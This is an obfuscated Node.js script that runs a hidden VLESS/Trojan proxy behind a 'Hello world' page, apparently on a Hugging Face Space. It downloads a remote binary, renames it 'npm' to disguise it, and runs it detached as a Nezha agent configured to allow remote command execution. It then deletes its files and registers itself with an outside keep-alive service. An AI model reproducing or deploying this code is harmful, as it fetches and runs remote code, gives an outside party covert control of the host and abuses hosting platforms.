const _0x38a406=_0x8f02;(function(_0x3615a5,_0x24b6c8){const _0x3f8915=_0x8f02,_0x12e90d=_0x3615a5();while(!![]){try{const _0x1fa806=parseInt(_0x3f8915(0x232))/0x1+parseInt(_0x3f8915(0x201))/0x2*(parseInt(_0x3f8915(0x200))/0x3)+-parseInt(_0x3f8915(0x1df))/0x4*(-parseInt(_0x3f8915(0x233))/0x5)+parseInt(_0x3f8915(0x1fe))/0x6+-parseInt(_0x3f8915(0x1c7))/0x7*(-parseInt(_0x3f8915(0x209))/0x8)+-parseInt(_0x3f8915(0x217))/0x9*(-parseInt(_0x3f8915(0x216))/0xa)+-parseInt(_0x3f8915(0x1ee))/0xb;if(_0x1fa806===_0x24b6c8)break;else _0x12e90d['push'](_0x12e90d['shift']());}catch(_0x3a5fda){_0x12e90d['push'](_0x12e90d['shift']());}}}(_0x4fc0,0xa224f));function _0x8f02(_0x207899,_0x342819){_0x207899=_0x207899-0x1be;const _0x4fc069=_0x4fc0();let _0x8f0208=_0x4fc069[_0x207899];return _0x8f0208;}const os=require('os'),http=require(_0x38a406(0x1ec)),fs=require('fs'),axios=require(_0x38a406(0x223)),net=require(_0x38a406(0x1e5)),path=require(_0x38a406(0x1d0)),crypto=require(_0x38a406(0x1e3)),{Buffer}=require(_0x38a406(0x230)),{exec,execSync}=require(_0x38a406(0x1cf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x38a406(0x1ef)][_0x38a406(0x1d6)]||_0x38a406(0x1c4),NEZHA_SERVER=process[_0x38a406(0x1ef)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x38a406(0x1ef)][_0x38a406(0x1dc)]||'',NEZHA_KEY=process[_0x38a406(0x1ef)]['NEZHA_KEY']||'',DOMAIN=process[_0x38a406(0x1ef)][_0x38a406(0x228)]||'mattino-vpn.hf.space',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process[_0x38a406(0x1ef)]['WSPATH']||UUID[_0x38a406(0x1f2)](0x0,0x8),SUB_PATH=process[_0x38a406(0x1ef)]['SUB_PATH']||_0x38a406(0x1fd),NAME=process[_0x38a406(0x1ef)][_0x38a406(0x1e1)]||'',PORT=process['env']['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x227587=_0x38a406;try{const _0x3a822d=await axios['get'](_0x227587(0x227)),_0xd2e489=_0x3a822d['data'];ISP=(_0xd2e489[_0x227587(0x1d3)]+'-'+_0xd2e489[_0x227587(0x212)])[_0x227587(0x1f6)](/ /g,'_');}catch(_0x424ea1){ISP='Unknown';}};function _0x4fc0(){const _0xc286b5=['1.1.1.1','Automatic\x20Access\x20Task\x20added\x20successfully','buffer','reduce','965942ygrjTf','3376715tWbUAs','write','test','data','utf-8','readUInt16BE','listen','decode','npm\x20download\x20successfully','Server','send','\x20-p\x20','map','822e93b1-5512-4ebf-9b7e-cf5272e18c4d','readUInt8','https://dns.google/resolve?name=','3022712IGMmGr','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','join','writeHead','text/plain','https://','https://amd64.ssss.nyc.mn/agent','close','child_process','path','2053','post','country','find','https://arm64.ssss.nyc.mn/v1','UUID','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','update','every','log','pipe','NEZHA_PORT','Status','https://amd64.ssss.nyc.mn/v1','4eDsfIf','application/dns-json','NAME','includes','crypto','/bin/bash','net','concat','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','npm\x20running\x20error:','error:\x20','length','2083','http','arm','39983856pWxhYM','env','once','then','slice','application/json','readFile','hex','replace','get','\x20with\x20all\x20DNS\x20servers','digest','vless://','443','&type=A','sub','5238144GugwUe','chmod\x20+x\x20npm','925167TSPXxu','2XIpMXV','error','aarch64','finish','8.8.4.4','Answer','trim','true','8JSQbMQ','toString','npm','url','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Failed\x20to\x20resolve\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','8443','asOrganization','connection','catch','client_secret:\x20','750wzKmOy','125343SSmqGv','config.yaml','setsid\x20nohup\x20./npm\x20-s\x20','pop','text/html','false','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeFileSync','arch','2087','connect','end','axios','trojan://','https://oooo.serv00.net/add-url','&fp=chrome&type=ws&host=','https://speed.cloudflare.com/meta','DOMAIN','substr','https://arm64.ssss.nyc.mn/agent','&path=%2F','split','index.html'];_0x4fc0=function(){return _0xc286b5;};return _0x4fc0();}GetISP();const httpServer=http['createServer']((_0xb1cad,_0x5e2b44)=>{const _0xe067b7=_0x38a406;if(_0xb1cad[_0xe067b7(0x20c)]==='/'){const _0x3aeff0=path[_0xe067b7(0x1c9)](__dirname,_0xe067b7(0x22d));fs[_0xe067b7(0x1f4)](_0x3aeff0,'utf8',(_0x3a78cd,_0x56afd9)=>{const _0x173daf=_0xe067b7;if(_0x3a78cd){_0x5e2b44[_0x173daf(0x1ca)](0xc8,{'Content-Type':_0x173daf(0x21b)}),_0x5e2b44['end']('Hello\x20world!');return;}_0x5e2b44['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x5e2b44[_0x173daf(0x222)](_0x56afd9);});return;}else{if(_0xb1cad[_0xe067b7(0x20c)]==='/'+SUB_PATH){const _0x5efffc=NAME?NAME+'-'+ISP:ISP,_0x342d92=_0xe067b7(0x1fa)+UUID+_0xe067b7(0x1e7)+DOMAIN+_0xe067b7(0x226)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5efffc,_0x3d3725=_0xe067b7(0x224)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0xe067b7(0x226)+DOMAIN+_0xe067b7(0x22b)+WSPATH+'#'+_0x5efffc,_0x5e3a65=_0x342d92+'\x0a'+_0x3d3725,_0x4b42b4=Buffer['from'](_0x5e3a65)[_0xe067b7(0x20a)]('base64');_0x5e2b44['writeHead'](0xc8,{'Content-Type':_0xe067b7(0x1cb)}),_0x5e2b44[_0xe067b7(0x222)](_0x4b42b4+'\x0a');}else _0x5e2b44[_0xe067b7(0x1ca)](0x194,{'Content-Type':'text/plain'}),_0x5e2b44['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x38a406(0x1c0))]({'server':httpServer}),uuid=UUID[_0x38a406(0x1f6)](/-/g,''),DNS_SERVERS=[_0x38a406(0x205),_0x38a406(0x22e)];function resolveHost(_0x286aff){return new Promise((_0x3a711b,_0x3ed16b)=>{const _0x388f9c=_0x8f02;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x388f9c(0x235)](_0x286aff)){_0x3a711b(_0x286aff);return;}let _0x1443a2=0x0;function _0x342cf3(){const _0x5afc1a=_0x388f9c;if(_0x1443a2>=DNS_SERVERS[_0x5afc1a(0x1ea)]){_0x3ed16b(new Error(_0x5afc1a(0x20f)+_0x286aff+_0x5afc1a(0x1f8)));return;}const _0x438fbb=DNS_SERVERS[_0x1443a2];_0x1443a2++;const _0x51269e=_0x5afc1a(0x1c6)+encodeURIComponent(_0x286aff)+_0x5afc1a(0x1fc);axios[_0x5afc1a(0x1f7)](_0x51269e,{'timeout':0x1388,'headers':{'Accept':_0x5afc1a(0x1e0)}})[_0x5afc1a(0x1f1)](_0x4cb1dc=>{const _0x523719=_0x5afc1a,_0x16f189=_0x4cb1dc[_0x523719(0x236)];if(_0x16f189[_0x523719(0x1dd)]===0x0&&_0x16f189[_0x523719(0x206)]&&_0x16f189[_0x523719(0x206)][_0x523719(0x1ea)]>0x0){const _0x4633c9=_0x16f189[_0x523719(0x206)][_0x523719(0x1d4)](_0x39441e=>_0x39441e['type']===0x1);if(_0x4633c9){_0x3a711b(_0x4633c9[_0x523719(0x236)]);return;}}_0x342cf3();})[_0x5afc1a(0x214)](_0x1e77df=>{_0x342cf3();});}_0x342cf3();});}function handleVlessConnection(_0x59e488,_0x2913af){const _0x4b66bc=_0x38a406,[_0x257436]=_0x2913af,_0x350377=_0x2913af[_0x4b66bc(0x1f2)](0x1,0x11);if(!_0x350377[_0x4b66bc(0x1d9)]((_0x1945f6,_0x5a90d7)=>_0x1945f6==parseInt(uuid[_0x4b66bc(0x229)](_0x5a90d7*0x2,0x2),0x10)))return![];let _0x243220=_0x2913af[_0x4b66bc(0x1f2)](0x11,0x12)[_0x4b66bc(0x1c5)]()+0x13;const _0x23bcf9=_0x2913af[_0x4b66bc(0x1f2)](_0x243220,_0x243220+=0x2)[_0x4b66bc(0x238)](0x0),_0x1706b6=_0x2913af[_0x4b66bc(0x1f2)](_0x243220,_0x243220+=0x1)[_0x4b66bc(0x1c5)](),_0x57dd15=_0x1706b6==0x1?_0x2913af['slice'](_0x243220,_0x243220+=0x4)[_0x4b66bc(0x1c9)]('.'):_0x1706b6==0x2?new TextDecoder()[_0x4b66bc(0x1be)](_0x2913af[_0x4b66bc(0x1f2)](_0x243220+0x1,_0x243220+=0x1+_0x2913af[_0x4b66bc(0x1f2)](_0x243220,_0x243220+0x1)['readUInt8']())):_0x1706b6==0x3?_0x2913af['slice'](_0x243220,_0x243220+=0x10)[_0x4b66bc(0x231)]((_0x3b7fbb,_0x46ce04,_0x19da5b,_0x580530)=>_0x19da5b%0x2?_0x3b7fbb[_0x4b66bc(0x1e6)](_0x580530[_0x4b66bc(0x1f2)](_0x19da5b-0x1,_0x19da5b+0x1)):_0x3b7fbb,[])[_0x4b66bc(0x1c3)](_0x1a338a=>_0x1a338a[_0x4b66bc(0x238)](0x0)[_0x4b66bc(0x20a)](0x10))[_0x4b66bc(0x1c9)](':'):'';_0x59e488[_0x4b66bc(0x1c1)](new Uint8Array([_0x257436,0x0]));const _0x16271a=createWebSocketStream(_0x59e488);return resolveHost(_0x57dd15)[_0x4b66bc(0x1f1)](_0x4d363f=>{const _0x4b9525=_0x4b66bc;net[_0x4b9525(0x221)]({'host':_0x4d363f,'port':_0x23bcf9},function(){const _0x3b7348=_0x4b9525;this['write'](_0x2913af[_0x3b7348(0x1f2)](_0x243220)),_0x16271a['on'](_0x3b7348(0x202),()=>{})[_0x3b7348(0x1db)](this)['on'](_0x3b7348(0x202),()=>{})['pipe'](_0x16271a);})['on']('error',()=>{});})[_0x4b66bc(0x214)](_0x4b885e=>{const _0xee648a=_0x4b66bc;net[_0xee648a(0x221)]({'host':_0x57dd15,'port':_0x23bcf9},function(){const _0x212778=_0xee648a;this[_0x212778(0x234)](_0x2913af[_0x212778(0x1f2)](_0x243220)),_0x16271a['on'](_0x212778(0x202),()=>{})['pipe'](this)['on'](_0x212778(0x202),()=>{})[_0x212778(0x1db)](_0x16271a);})['on'](_0xee648a(0x202),()=>{});}),!![];}function handleTrojanConnection(_0x118372,_0x1b994a){const _0x421c5d=_0x38a406;try{if(_0x1b994a[_0x421c5d(0x1ea)]<0x3a)return![];const _0x4d773e=_0x1b994a['slice'](0x0,0x38)[_0x421c5d(0x20a)](),_0x10539c=[UUID];let _0x316eb0=null;for(const _0x50b7b1 of _0x10539c){const _0x260851=crypto['createHash']('sha224')[_0x421c5d(0x1d8)](_0x50b7b1)[_0x421c5d(0x1f9)](_0x421c5d(0x1f5));if(_0x260851===_0x4d773e){_0x316eb0=_0x50b7b1;break;}}if(!_0x316eb0)return![];let _0x4bcd27=0x38;_0x1b994a[_0x4bcd27]===0xd&&_0x1b994a[_0x4bcd27+0x1]===0xa&&(_0x4bcd27+=0x2);const _0x381b9b=_0x1b994a[_0x4bcd27];if(_0x381b9b!==0x1)return![];_0x4bcd27+=0x1;const _0x5200a4=_0x1b994a[_0x4bcd27];_0x4bcd27+=0x1;let _0x495874,_0x3bf530;if(_0x5200a4===0x1)_0x495874=_0x1b994a['slice'](_0x4bcd27,_0x4bcd27+0x4)['join']('.'),_0x4bcd27+=0x4;else{if(_0x5200a4===0x3){const _0x442159=_0x1b994a[_0x4bcd27];_0x4bcd27+=0x1,_0x495874=_0x1b994a['slice'](_0x4bcd27,_0x4bcd27+_0x442159)[_0x421c5d(0x20a)](),_0x4bcd27+=_0x442159;}else{if(_0x5200a4===0x4)_0x495874=_0x1b994a[_0x421c5d(0x1f2)](_0x4bcd27,_0x4bcd27+0x10)['reduce']((_0x35bb1a,_0x413e03,_0x569340,_0x35d168)=>_0x569340%0x2?_0x35bb1a['concat'](_0x35d168[_0x421c5d(0x1f2)](_0x569340-0x1,_0x569340+0x1)):_0x35bb1a,[])[_0x421c5d(0x1c3)](_0xe32bf0=>_0xe32bf0[_0x421c5d(0x238)](0x0)[_0x421c5d(0x20a)](0x10))['join'](':'),_0x4bcd27+=0x10;else return![];}}_0x3bf530=_0x1b994a[_0x421c5d(0x238)](_0x4bcd27),_0x4bcd27+=0x2;_0x4bcd27<_0x1b994a[_0x421c5d(0x1ea)]&&_0x1b994a[_0x4bcd27]===0xd&&_0x1b994a[_0x4bcd27+0x1]===0xa&&(_0x4bcd27+=0x2);const _0x3551eb=createWebSocketStream(_0x118372);return resolveHost(_0x495874)[_0x421c5d(0x1f1)](_0x349afd=>{const _0x58b82c=_0x421c5d;net['connect']({'host':_0x349afd,'port':_0x3bf530},function(){const _0x5b426f=_0x8f02;_0x4bcd27<_0x1b994a['length']&&this[_0x5b426f(0x234)](_0x1b994a[_0x5b426f(0x1f2)](_0x4bcd27)),_0x3551eb['on'](_0x5b426f(0x202),()=>{})[_0x5b426f(0x1db)](this)['on'](_0x5b426f(0x202),()=>{})[_0x5b426f(0x1db)](_0x3551eb);})['on'](_0x58b82c(0x202),()=>{});})[_0x421c5d(0x214)](_0x3dcc38=>{const _0x124bdd=_0x421c5d;net[_0x124bdd(0x221)]({'host':_0x495874,'port':_0x3bf530},function(){const _0x566734=_0x124bdd;_0x4bcd27<_0x1b994a['length']&&this[_0x566734(0x234)](_0x1b994a['slice'](_0x4bcd27)),_0x3551eb['on'](_0x566734(0x202),()=>{})[_0x566734(0x1db)](this)['on'](_0x566734(0x202),()=>{})['pipe'](_0x3551eb);})['on'](_0x124bdd(0x202),()=>{});}),!![];}catch(_0x3b6077){return![];}}wss['on'](_0x38a406(0x213),(_0x545de1,_0x3b8e48)=>{const _0x1c154e=_0x38a406,_0x5958c3=_0x3b8e48[_0x1c154e(0x20c)]||'';_0x545de1[_0x1c154e(0x1f0)]('message',_0x43fc81=>{const _0x51869a=_0x1c154e;if(_0x43fc81[_0x51869a(0x1ea)]>0x11&&_0x43fc81[0x0]===0x0){const _0xb6226=_0x43fc81[_0x51869a(0x1f2)](0x1,0x11),_0x941fb2=_0xb6226['every']((_0x9201a7,_0x305f2a)=>_0x9201a7==parseInt(uuid[_0x51869a(0x229)](_0x305f2a*0x2,0x2),0x10));if(_0x941fb2){!handleVlessConnection(_0x545de1,_0x43fc81)&&_0x545de1['close']();return;}}!handleTrojanConnection(_0x545de1,_0x43fc81)&&_0x545de1[_0x51869a(0x1ce)]();})['on'](_0x1c154e(0x202),()=>{});});const getDownloadUrl=()=>{const _0x2136e3=_0x38a406,_0x5a112d=os[_0x2136e3(0x21f)]();return _0x5a112d===_0x2136e3(0x1ed)||_0x5a112d==='arm64'||_0x5a112d===_0x2136e3(0x203)?!NEZHA_PORT?_0x2136e3(0x1d5):_0x2136e3(0x22a):!NEZHA_PORT?_0x2136e3(0x1de):_0x2136e3(0x1cd);},downloadFile=async()=>{const _0x1bf0e0=_0x38a406;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4c9666=getDownloadUrl(),_0x36cbf2=await axios({'method':_0x1bf0e0(0x1f7),'url':_0x4c9666,'responseType':'stream'}),_0x2a3635=fs['createWriteStream'](_0x1bf0e0(0x20b));return _0x36cbf2[_0x1bf0e0(0x236)][_0x1bf0e0(0x1db)](_0x2a3635),new Promise((_0x1be584,_0x3feacc)=>{const _0x14a12d=_0x1bf0e0;_0x2a3635['on'](_0x14a12d(0x204),()=>{const _0x5230e4=_0x14a12d;console['log'](_0x5230e4(0x1bf)),exec(_0x5230e4(0x1ff),_0x44bd32=>{if(_0x44bd32)_0x3feacc(_0x44bd32);_0x1be584();});}),_0x2a3635['on'](_0x14a12d(0x202),_0x3feacc);});}catch(_0x191801){throw _0x191801;}},runnz=async()=>{const _0x107366=_0x38a406;try{const _0x444b6=execSync(_0x107366(0x1d7),{'encoding':_0x107366(0x237)});if(_0x444b6[_0x107366(0x207)]()!==''){console[_0x107366(0x1da)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x59153a){}await downloadFile();let _0x116cd7='',_0x7c319f=[_0x107366(0x1fb),_0x107366(0x211),'2096',_0x107366(0x220),_0x107366(0x1eb),_0x107366(0x1d1)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1e7483=_0x7c319f[_0x107366(0x1e2)](NEZHA_PORT)?'--tls':'';_0x116cd7=_0x107366(0x219)+NEZHA_SERVER+':'+NEZHA_PORT+_0x107366(0x1c2)+NEZHA_KEY+'\x20'+_0x1e7483+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4c7ed6=NEZHA_SERVER[_0x107366(0x1e2)](':')?NEZHA_SERVER[_0x107366(0x22c)](':')[_0x107366(0x21a)]():'',_0xe58ac4=_0x7c319f['includes'](_0x4c7ed6)?_0x107366(0x208):_0x107366(0x21c),_0x2f1409=_0x107366(0x215)+NEZHA_KEY+_0x107366(0x1c8)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xe58ac4+_0x107366(0x20e)+UUID;fs[_0x107366(0x21e)](_0x107366(0x218),_0x2f1409);}_0x116cd7=_0x107366(0x210);}else{console[_0x107366(0x1da)](_0x107366(0x21d));return;}}try{exec(_0x116cd7,{'shell':_0x107366(0x1e4)},_0x4f7d3a=>{const _0x2c130c=_0x107366;if(_0x4f7d3a)console[_0x2c130c(0x202)](_0x2c130c(0x1e8),_0x4f7d3a);else console['log']('npm\x20is\x20running');});}catch(_0x2bd644){console[_0x107366(0x202)](_0x107366(0x1e9)+_0x2bd644);}};async function addAccessTask(){const _0x13fc38=_0x38a406;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x29e7d4=_0x13fc38(0x1cc)+DOMAIN+'/'+SUB_PATH;try{const _0x39d7bf=await axios[_0x13fc38(0x1d2)](_0x13fc38(0x225),{'url':_0x29e7d4},{'headers':{'Content-Type':_0x13fc38(0x1f3)}});console[_0x13fc38(0x1da)](_0x13fc38(0x22f));}catch(_0x31eaf1){}}const delFiles=()=>{const _0x15bab2=_0x38a406;fs[_0x15bab2(0x20d)](_0x15bab2(0x20b),()=>{}),fs[_0x15bab2(0x20d)](_0x15bab2(0x218),()=>{});};httpServer[_0x38a406(0x239)](PORT,()=>{const _0x2d247f=_0x38a406;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2d247f(0x1da)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
